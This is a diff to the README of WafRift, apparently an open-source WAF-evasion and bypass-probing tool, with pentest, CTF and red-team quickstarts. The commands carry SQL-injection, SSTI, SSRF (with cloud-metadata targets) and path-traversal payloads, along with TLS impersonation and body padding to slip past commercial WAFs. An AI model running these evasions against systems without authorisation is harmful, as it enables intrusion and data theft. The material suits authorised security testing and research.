@@ -6,9 +6,44 @@
 
 > Part of the [Santh](https://santh.dev) security research ecosystem.
 
-**A programmable WAF-evasion engine with per-technique controls — and an evolutionary mode that learns bypasses for you.**
+**A programmable WAF-evasion engine with per-technique controls, and an evolutionary mode that learns bypasses for you.**
 
-Other tools give you one trick: junk padding, header injection, smuggling, or a static tamper list. WafRift is the union — encoding, grammar-aware mutation, content-type switching, request smuggling, and TLS/HTTP fingerprint rotation. The CLI exposes every encoding strategy and the grammar layer as fine-grained `--only`/`--exclude` selectors; the rest run as part of the default pipeline. Per-host toggle persistence and a Burp Suite control panel are tracked in the [roadmap](docs/GAP_CLOSURE_ROADMAP.md). Turn the engine loose and a search loop (hill-climb / SA / tabu / novelty / MAP-Elites) discovers what bypasses the target WAF and persists winning pipelines to a per-WAF **gene bank** so the next scan starts with zero discovery phase.
+Other tools give you one trick: junk padding, header injection, smuggling, or a static tamper list. WafRift is the union: encoding, grammar-aware mutation, content-type switching, request smuggling, and TLS/HTTP fingerprint rotation. The CLI exposes every encoding strategy and the grammar layer as fine-grained `--only`/`--exclude` selectors; the rest run as part of the default pipeline. Per-host toggle persistence and a Burp Suite control panel are tracked in the [roadmap](docs/GAP_CLOSURE_ROADMAP.md). Turn the engine loose and a search loop (hill-climb / SA / tabu / novelty / MAP-Elites) discovers what bypasses the target WAF and persists winning pipelines to a per-WAF **gene bank** so the next scan starts with zero discovery phase.
+
+## What's new (Unreleased / v0.2.3-dev)
+
+- **`wafrift bypass-probe URL`** — the Tsai-class differential vuln
+  finder. Fires 184+ probes (auth-bypass headers, path-routing
+  variants, method overrides) against a single URL or a `--paths-file`
+  list, classifies each response vs the baseline, reports HIGH /
+  MEDIUM / LOW divergences with reproduce-it `curl` commands.
+  Bounded-concurrency (`--concurrency 8` default) — 12 paths × ~190
+  probes each finishes in <1 second.
+- **`wafrift evade --payload "http://allowed.com/"`** now generates
+  the full Orange-Tsai parser-confusion family (basic userinfo,
+  GitLab CVE-2018-19571 fragment-userinfo, query-userinfo, backslash,
+  `%40` / `%2540`, port-then-userinfo, newline / null in authority)
+  for SSRF payloads — using the user's input host as the cover and
+  rotating cloud-metadata targets through the userinfo position.
+- **`wafrift-proxy --tui`** rewritten as a real MITM live viewer.
+  Three tabs (Flow / Overview / Hosts), per-request inspect pane
+  showing both directions (headers + body excerpts), live req/s
+  + bypasses/s sparklines, status-graded coloring. `j`/`k` to
+  navigate, `Enter` to inspect, `Tab` to switch tabs.
+- **`wafrift-proxy --mitm`** no longer aborts on HTTPS — the rustls
+  CryptoProvider is now installed at startup. Verified end-to-end
+  against `example.com`.
+- **Stability**: a single 100 KB POST used to hang the proxy and
+  cascade-kill it under load (held a global mutex across MCTS
+  iteration). Lock now snapshots state and runs evasion outside.
+  50 concurrent reqs → 50 HTTP 200 instead of all timeout.
+- **Bench corpus**: 579 → 607 cases. New TOML files for
+  parser-confusion-authority (SSRF) and routing-disagreement
+  (path).
+- See `CHANGELOG.md` `[Unreleased]` section for the full list
+  (lock fix, MCTS body budget, three more UTF-8 mutator panics,
+  `--insecure` warn, gene-bank race fix, eleven misplaced test
+  blocks rescued, clippy `-D warnings` clean).
 
 ## Measured bypass rates
 
@@ -32,8 +67,8 @@ structurally as a valid attack, not garbage that slipped past).
 | PL=3 | 60k | 17.3k | 28% | 557 / 557 (100%) |
 | **PL=4** (most aggressive) | 60k | 16.3k | **27%** | **557 / 557 (100%)** |
 
-**At every paranoia level — including PL=4, the most paranoid CRS
-preset — every single attack case in the corpus has at least one
+**At every paranoia level, including PL=4, the most paranoid CRS
+preset: every single attack case in the corpus has at least one
 working bypass when the full strategy stack is applied with 60+
 variants per case.** Once a working evasion seed exists, the per-host
 gene bank (`~/.wafrift/genomes/`) replays it indefinitely, so
@@ -44,7 +79,7 @@ phase.
 search-budget result, not a one-shot bypass rate. With the proxy alone
 on default settings (no `--max-evade-retries`, only HTTP-layer
 escalation) a single naked SQLi against PL=4 will typically still get
-blocked — the proxy doesn't currently mutate URL-injected payload
+blocked: the proxy doesn't currently mutate URL-injected payload
 bytes, only HTTP-layer artefacts (UA / headers / body encoding).
 Payload-byte mutation lives in `wafrift scan` and `wafrift bench-waf`.
 For a worked example see
@@ -64,32 +99,26 @@ cargo run --release -p wafrift-cli -- bench-waf \
 jq .evaded_summary repro.json
 ```
 
-## Why WafRift?
-
-**Composable, not monolithic.** Encoding strategies and the grammar layer are addressable as hierarchical paths and individually selectable: `--only encoding/url` runs a surgical pipeline; `--exclude encoding/url/triple,grammar` keeps the loud transforms off; default = full pipeline. Run `wafrift techniques list` to see every selector.
-
-#### vs other open-source tools
+## How WafRift compares
 
 | Tool | Encoding | Grammar mutation | Smuggling | Content-type swap | Per-host learning | Forward proxy | Replay |
 |---|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
-| sqlmap `--tamper` | partial | SQL only | ✗ | ✗ | ✗ | via `--proxy` | ✗ |
-| Burp `nowafpls` | ✗ | ✗ | ✗ | ✗ | ✗ | Burp ext. | ✗ |
-| Burp "Bypass WAF" | header tricks | ✗ | ✗ | ✗ | ✗ | Burp ext. | ✗ |
-| `HTTP Request Smuggler` | ✗ | ✗ | ✓ | ✗ | ✗ | Burp ext. | ✗ |
-| **WafRift** | **✓ 15+ strategies** | **✓ SQL/XSS/CMD/SSTI/path/LDAP/SSRF** | **✓ CL.TE / TE.CL / TE.TE** | **✓ multipart/json/xml** | **✓ gene-bank** | **✓ standalone + MITM** | **✓ deterministic** |
+| sqlmap `--tamper` | partial | SQL only | – | – | – | via `--proxy` | – |
+| Burp `nowafpls` | – | – | – | – | – | Burp ext. | – |
+| Burp "Bypass WAF" | header tricks | – | – | – | – | Burp ext. | – |
+| HTTP Request Smuggler | – | – | yes | – | – | Burp ext. | – |
+| **WafRift** | **15+ strategies** | **SQL/XSS/CMD/SSTI/path/LDAP/SSRF** | **CL.TE / TE.CL / TE.TE** | **multipart/json/xml** | **gene-bank** | **standalone + MITM** | **deterministic** |
 
-The above is what WafRift adds on top of any single existing tool. It does NOT replace sqlmap (still the right tool for end-to-end SQLi exploitation against an unprotected target) or Burp (still the right intercepting GUI for an interactive session). WafRift is the evasion layer you add when those tools are blocked by a WAF.
-
-**Evolutionary, not static.** Most bypass tools apply the same transforms every time. WafRift:
-
-1. **Discovers** which evasion techniques bypass the target WAF
-2. **Prunes** techniques that get blocked
-3. **Rotates** only proven winners to avoid pattern detection
-4. **Adapts** — if the WAF learns to block a winner, WafRift detects the drift and rediscovers
-
-The gene bank (`~/.wafrift/genomes/`) persists learned bypasses across sessions. Scan a Cloudflare site once, and every future Cloudflare scan starts with proven bypasses — **zero discovery phase**.
-
-**Semantically correct.** Grammar mutations are validated against `sqlparser-rs` AST equivalence, so SQL variants actually parse — most tampers ship broken payloads and don't know it.
+WafRift does NOT replace sqlmap (still the right end-to-end SQLi
+exploitation tool against an unprotected target) or Burp (still the
+right intercepting GUI for an interactive session). WafRift is the
+evasion layer you add when those tools are blocked by a WAF. Once a
+working evasion seed exists, the per-host gene bank
+(`~/.wafrift/genomes/`) replays it indefinitely — a Cloudflare scan
+starts with proven bypasses on every subsequent run, **zero
+discovery phase**. Grammar mutations are validated against
+`sqlparser-rs` AST equivalence, so SQL variants actually parse — most
+tampers ship broken payloads and don't know it.
 
 ## Installation
 
@@ -111,7 +140,7 @@ mv wafrift wafrift-proxy /usr/local/bin/
 
 ```bash
 cargo install wafrift-cli --version '>=0.2.2'
-# Optional: TLS impersonation (rquest 5.x + BoringSSL — adds boring-sys C build)
+# Optional: TLS impersonation (rquest 5.x + BoringSSL, adds boring-sys C build)
 cargo install wafrift-proxy --version '>=0.2.2' --features tls-impersonate
 ```
 
@@ -140,19 +169,19 @@ cargo install --path crates/cli
 
 ## Quickstart
 
-Pick your workflow — each is copy-paste ready.
+Pick your workflow: each is copy-paste ready.
 
-### 🏁 CTF — "I have a SQLi but there's a WAF"
+### 🏁 CTF: "I have a SQLi but there's a WAF"
 
 ```bash
-# Get bypass variants instantly (offline — no target needed)
+# Get bypass variants instantly (offline, no target needed)
 wafrift evade --payload "' OR 1=1--" --level heavy
 
 # Found a WAF? Fire all variants and see what gets through
 wafrift scan --target http://ctf.example/vuln --payload "' OR 1=1--"
 ```
 
-### 🔍 Pentest — "sqlmap/ffuf behind a WAF"
+### 🔍 Pentest: "sqlmap/ffuf behind a WAF"
 
 ```bash
 # Start the evasion proxy
@@ -166,7 +195,7 @@ ffuf -x http://127.0.0.1:8080 -u https://target/FUZZ -w wordlist.txt
 curl http://127.0.0.1:8080/_wafrift/findings.md
 ```
 
-### 🎯 Bug Bounty — "Scan this target, give me a report"
+### 🎯 Bug Bounty: "Scan this target, give me a report"
 
 ```bash
 # Full autonomous scan with JSON output
@@ -177,7 +206,7 @@ wafrift scan --target https://target.com --payload "' UNION SELECT 1--" \
 wafrift report --only-host target.com --output writeup.md
 ```
 
-### 🗺️ Discovery — "I have an OpenAPI spec / GraphQL endpoint, find injection points"
+### 🗺️ Discovery: "I have an OpenAPI spec / GraphQL endpoint, find injection points"
 
 ```bash
 # Parse an OpenAPI 2.0/3.x JSON spec into structured injection points
@@ -199,10 +228,10 @@ wafrift discover --spec api.json --target https://app.example.com \
 Each injection point carries its `ParameterLocation` (Query / Path /
 Header / Cookie / Body), `InjectionContext` (`JsonString` /
 `UrlQuery` / `XmlText` / `MultipartField` / etc.) inferred from the
-spec's media type, and a `required` flag — letting `wafrift scan`
+spec's media type, and a `required` flag: letting `wafrift scan`
 pick context-aware encodings instead of guessing.
 
-### 🛡️ Stealth — "Cloudflare/Akamai blocks me on JA3 before I can even probe"
+### 🛡️ Stealth: "Cloudflare/Akamai blocks me on JA3 before I can even probe"
 
 ```bash
 # One-time: build with the BoringSSL impersonation feature.
@@ -210,7 +239,7 @@ cargo install wafrift-proxy --features tls-impersonate
 
 # Run the proxy wearing a real Chrome 131 ClientHello on every
 # upstream forward. JA3 / JA4 / h2 SETTINGS all match a real browser
-# bytes-for-bytes — edge WAFs that classify on TLS fingerprint
+# bytes-for-bytes: edge WAFs that classify on TLS fingerprint
 # (Cloudflare bot management, Akamai, Sigsci, Imperva Bot Protection)
 # see "browser" instead of "rustls" and let the connection through to
 # inspection, where wafrift's HTTP-level evasion takes over.
@@ -228,7 +257,7 @@ sqlmap -u "https://target.cloudflare-protected.com/x?id=1" --proxy=http://127.0.
 #### Per-request fingerprint rotation + body padding
 
 Cloud WAFs inspect only the leading bytes of a request body
-(Cloudflare Pro 8 KB, AWS WAF 16 KB, Akamai 8 KB) — pad past that
+(Cloudflare Pro 8 KB, AWS WAF 16 KB, Akamai 8 KB): pad past that
 window and the rule engine never sees the malicious bytes. Combine
 with TLS profile rotation and a fresh TCP source port per request:
 
@@ -252,7 +281,7 @@ wafrift-proxy --listen 127.0.0.1:8080 \
   TLS rotation distribution, padded-body counter, live request stream).
   Press `q` for graceful shutdown, `r` to reset counters.
 
-### 🔴 Red Team — "Persistent evasion against the same WAF"
+### 🔴 Red Team: "Persistent evasion against the same WAF"
 
 ```bash
 # First scan learns what bypasses the WAF in front of target.com
@@ -275,175 +304,102 @@ wafrift replay --target https://target.com --param id \
 > there are no pre-shipped vendor genomes; first scan against any new
 > WAF goes through full discovery.
 
-## Usage
+## Operator reference
 
-### Interactive Mode (default)
+The persona quickstarts above cover most workflows. Three areas warrant
+their own reference because they're easy to miss otherwise.
 
-```bash
-wafrift
-```
+### Live MITM dashboard (`wafrift-proxy --tui`)
 
-Launches a ratatui-based terminal UI with keyboard navigation. Features:
+Three tabs. Switch with `Tab` or `1`/`2`/`3` (or `f`/`o`/`h`).
 
-- **Gene Bank Browser** — view per-WAF genome data, technique success rates, and historical scans
-- **Technique Tree** — hierarchical view of all encoding/grammar/smuggling technique paths
-- **Guided Command Builder** — step through scan/evade/detect with prompts instead of memorizing flags
-- **Status Dashboard** — at-a-glance learning cache size, genome count, and last scan summary
+- **Flow** — bounded ring of 500 requests with status-graded coloring
+  (2xx green, 3xx cyan, 4xx yellow, 5xx red; outcome BYPASS green,
+  BLOCK red, PASS white). `j`/`k` navigate, `g`/`G` jump to first /
+  last, `Enter` toggles a side detail pane that shows the full
+  inspection: outgoing request line + every post-evasion header +
+  body excerpt; incoming response status + every header + body
+  excerpt; summary block (WAF, attempts, latency, body padding, TLS
+  profile, technique chain, total response size). Two sparklines
+  underneath: req/s and bypasses/s over the last 60 s.
+- **Overview** — counters, TLS rotation gauge, WAFs identified.
+- **Hosts** — per-host bypass table sortable by sent count, with
+  bypass-rate color grading and the identified WAF column.
+- `q` / `Esc` to quit (gracefully flushes the gene bank).
 
-**Keybindings:** `↑/↓` navigate, `Enter` select, `q` quit, `Tab` switch panels.
+### Fine-grained technique selection
 
-> **⚠️ Beta:** The interactive TUI is largely untested and may have rough edges. For production use, scripted workflows, and CI/CD, use the CLI subcommands directly (`wafrift scan`, `wafrift evade`, etc.).
-
-### Scan a Target
-
-```bash
-# Basic scan
-wafrift scan --target http://target.com --payload "' OR 1=1--"
-
-# XSS scan with heavy evasion
-wafrift scan --target http://target.com --payload "<script>alert(1)</script>" --level heavy
-
-# JSON output for CI/CD
-wafrift scan --target http://target.com --payload "' OR 1=1--" --format json
-
-# JSON with fixed “layer” matrix (network / detection / baseline / evasion)
-wafrift scan --target http://target.com --payload "' OR 1=1--" --format json --report-layers
-
-# Egress preset (Tor SOCKS JSON for EvasionConfig)
-wafrift egress-example --preset tor
-
-# Custom parameter name
-wafrift scan --target http://target.com --payload "' UNION SELECT 1--" --param id
-```
-
-### Transform Payloads (offline)
+Every encoding strategy and the grammar layer is addressable as a
+hierarchical path. List the tree, then include or exclude per command:
 
 ```bash
-# Light evasion
-wafrift evade --payload "' OR 1=1--" --level light
-
-# Heavy evasion with all techniques
-wafrift evade --payload "' OR 1=1--" --level heavy
-```
-
-### Fine-Grained Technique Selection
-
-Every encoding strategy and the grammar layer are addressable as hierarchical paths.
-List what's available, then include or exclude per scan:
-
-```bash
-# See the full tree
-wafrift techniques list
-
-# Only URL-family encodings (no grammar, no Unicode, no entities)
+wafrift techniques list                                # see the tree
 wafrift evade --payload "' OR 1=1--" --only encoding/url
-
-# Everything except triple-URL and SQL-comment tampers
 wafrift scan --target http://target.com --payload "' OR 1=1--" \
-  --exclude encoding/url/triple,encoding/sql/comment
-
-# Compose: only URL family, but skip the noisiest variant
-wafrift evade --payload "' OR 1=1--" \
-  --only encoding/url --exclude encoding/url/triple
+    --exclude encoding/url/triple,encoding/sql/comment
 ```
 
 Unknown selectors fail fast — no silent drops.
 
-### Detect a WAF
+### Differential bypass probing (`wafrift bypass-probe`)
+
+For Tsai-class boundary-mismatch vulns (admin panel gated by WAF
+header rule, `X-Original-URL` rewrite, ProxyShell-style routing
+disagreement, IP-trust spoofing), point bypass-probe at the resource
+and let it fire 184+ probes:
 
 ```bash
-wafrift detect --status 403 --headers "server: cloudflare" --body "Attention Required!"
+# Single URL
+wafrift bypass-probe https://target/admin --concurrency 16
+
+# Whole admin surface from a list
+cat > paths.txt <<EOF
+/admin
+/api/admin
+/.env
+/actuator/env
+/wp-admin
+EOF
+wafrift bypass-probe https://target --paths-file paths.txt \
+    --concurrency 16 --min-severity medium --format json > findings.json
 ```
 
-### Proxy Mode
+Each divergence (status flip, body delta) is reported with a
+reproduce-it `curl` one-liner.
+
+### Proxy scope, rate limit, live findings
 
 ```bash
-# Start evasion proxy on port 8080
-wafrift-proxy --listen 127.0.0.1:8080
-
-# Force heavy-level evasion
-wafrift-proxy --listen 127.0.0.1:8080 --escalation heavy
-
-# HTTPS MITM (install generated CA in the client first — see docs/PROXY_TOOLING.md)
-wafrift-proxy --write-mitm-ca-dir ./mitm-ca
-wafrift-proxy --listen 127.0.0.1:8080 --mitm --mitm-ca-dir ./mitm-ca
-```
-
-Point your scanner at the proxy — all traffic is automatically transformed to bypass WAF rules. The proxy learns per-host: discovery → rotation → drift detection → re-discovery. With **`--mitm`**, TLS on `CONNECT` is terminated so HTTPS requests go through the same evasion path (authorized targets only).
-
-#### Scope filters (don't break login flows / static assets)
-
-By default the proxy evades **every** request, which is the wrong shape when you've pointed Burp at it and are also browsing the application normally. Scope filters let you keep wafrift active only where you want it; everything else is forwarded verbatim with no evasion, no gene-bank update, no detection.
-
-```bash
-# Only evade traffic to *.example.com on JSON API endpoints,
-# leave login + static assets untouched.
+# Only evade *.example.com on JSON API endpoints; skip login + static.
 wafrift-proxy --listen 127.0.0.1:8080 --mitm \
   --only-host '*.example.com' \
   --skip-path '/static/*,/oauth/*,/login,/favicon.ico' \
   --only-method 'POST,PUT,PATCH,DELETE'
-```
 
-Patterns use a tiny ASCII glob grammar (`*` matches any run, `?` matches one byte, case-insensitive). `--skip-host`/`--skip-path` are evaluated **after** `--only-host`/`--only-path`.
-
-#### Per-host rate limiting (don't accidentally DoS the target)
-
-```bash
 # Token bucket: 5 req/s per upstream host, burst of 10.
 wafrift-proxy --listen 127.0.0.1:8080 --mitm \
   --max-rps-per-host 5 --max-rps-per-host-burst 10
-```
 
-#### Live findings (curl the proxy mid-session)
-
-```bash
-# Loopback-only, peer-loopback gated.
+# Live findings, loopback-only:
 curl http://127.0.0.1:8080/_wafrift/findings.md   # markdown writeup
-curl http://127.0.0.1:8080/_wafrift/status        # JSON (schema_version + per-host stats)
+curl http://127.0.0.1:8080/_wafrift/status        # JSON (per-host stats)
 ```
 
-### End-to-end practitioner walkthrough (5 min)
+Globs use a tiny ASCII grammar (`*` matches any run, `?` matches one
+byte, case-insensitive). `--skip-host`/`--skip-path` evaluate after
+their `--only-*` counterparts.
 
-```bash
-# 1. Scaffold a config in the current directory (commented out — pure no-op until you edit).
-wafrift init
+### Authorisation
 
-# 2. Generate the MITM CA (auto-installs in OS trust store on Linux/macOS where possible;
-#    falls through to printed instructions on Windows).
-wafrift-proxy --write-mitm-ca-dir ~/.wafrift/mitm-ca
-
-# 3. Run the proxy in front of your client (Burp / browser / sqlmap / curl).
-wafrift-proxy --listen 127.0.0.1:8080 --mitm \
-  --only-host '*.target.tld' \
-  --skip-path '/static/*,/healthz' \
-  --max-rps-per-host 5 \
-  --max-evade-retries 3 \
-  --gene-bank-path ~/.wafrift/target.json
-
-# 4. Drive your client normally. Watch findings land in real time:
-curl -s http://127.0.0.1:8080/_wafrift/findings.md
-
-# 5. Render a pentest-shaped report from the gene bank.
-wafrift report --proxy-bank ~/.wafrift/target.json --output engagement.md
-
-# 6. Reproduce any individual finding deterministically (returns exit 0 = bypass, 2 = blocked).
-wafrift replay \
-  --target 'https://api.target.tld/search' \
-  --param q --payload "1' OR 1=1-- " \
-  --from-host 'api.target.tld' --proxy-bank ~/.wafrift/target.json
-
-# 7. Gate regressions in CI: snapshot bench output, compare future runs.
-wafrift bench-waf --target modsec-pl4 --strategies all --output current.json
-wafrift bench-diff --baseline baseline.json --current current.json --bypass-drop-pp 2
-```
-
-#### Authorisation
-
-`wafrift-proxy` refuses upstream targets in private/loopback/RFC1918/link-local ranges by default; pass `--allow-private-upstream` only against lab targets you own. `wafrift replay` and the differential probes send genuinely exploitable strings — only run them against systems you control or have explicit written authorisation to test.
+`wafrift-proxy` refuses upstream targets in private / loopback /
+RFC1918 / link-local ranges by default; pass `--allow-private-upstream`
+only against lab targets you own. `wafrift replay` and `bypass-probe`
+send genuinely exploitable strings: only run them against systems you
+control or have explicit written authorisation to test.
 
 ### CTF / pentest quick recipes
 
-Five common shapes a security practitioner runs into. Every recipe is a single command — no setup beyond `cargo install wafrift` (or `docker run santhsecurity/wafrift`) and the `--target`/`--payload` you'd be testing anyway.
+Five common shapes a security practitioner runs into. Every recipe is a single command: no setup beyond `cargo install wafrift` (or `docker run santhsecurity/wafrift`) and the `--target`/`--payload` you'd be testing anyway.
 
 **1. SQL-injection login bypass.** WAF blocks `' OR 1=1--`; find a variant that lands.
 
@@ -452,7 +408,7 @@ wafrift scan --target https://target/login \
   --payload "' OR 1=1--" --param username --level heavy
 ```
 
-Output prints which evasion technique chain produced the bypass. Replay later with the exact chain saved into the gene-bank — second run skips discovery.
+Output prints which evasion technique chain produced the bypass. Replay later with the exact chain saved into the gene-bank: second run skips discovery.
 
 **2. SSTI in a server-side template.** Variant of `{{7*7}}` that the WAF allows but the engine still evaluates.
 
@@ -461,7 +417,7 @@ wafrift scan --target https://target/profile \
   --payload "{{7*7}}" --param name --level heavy --only grammar/ssti,encoding
 ```
 
-`--only grammar/ssti,encoding` keeps the search focused — running the full pipeline against a single template reflection is slow.
+`--only grammar/ssti,encoding` keeps the search focused: running the full pipeline against a single template reflection is slow.
 
 **3. SSRF to internal admin.** Smuggle a `127.0.0.1:9000` request past a WAF that only blacklists string `127.0.0.1`.
 
@@ -471,7 +427,7 @@ wafrift scan --target https://target/preview \
   --only encoding,grammar/ssrf
 ```
 
-The differential probe set (`wafrift probe`) lists the sub-techniques the WAF reliably blocks for this class — handy when the scan comes back empty and you need to know what NOT to retry.
+The differential probe set (`wafrift probe`) lists the sub-techniques the WAF reliably blocks for this class, handy when the scan comes back empty and you need to know what NOT to retry.
 
 **4. Path traversal / LFI.** WAF blocks `../`; find a variant that survives.
 
@@ -552,7 +508,7 @@ The CLI’s live `scan` flow is built from `wafrift-strategy`, `wafrift-transpor
 
 ## As Individual Crates
 
-Use exactly the piece you need — no full-engine import required.
+Use exactly the piece you need: no full-engine import required.
 
 ```toml
 [dependencies]
@@ -667,7 +623,7 @@ building, or running wafrift you agree:
 
 1. **Authorisation is yours alone.** You will only run wafrift against
    systems you own, operate, or have explicit written authorisation to
-   test — bug-bounty scope, signed pentest agreement, CTF rules, or
+   test: bug-bounty scope, signed pentest agreement, CTF rules, or
    lab infrastructure under your control. Verify scope before each
    engagement.
 2. **Legal responsibility transfers to the operator.** The Santh
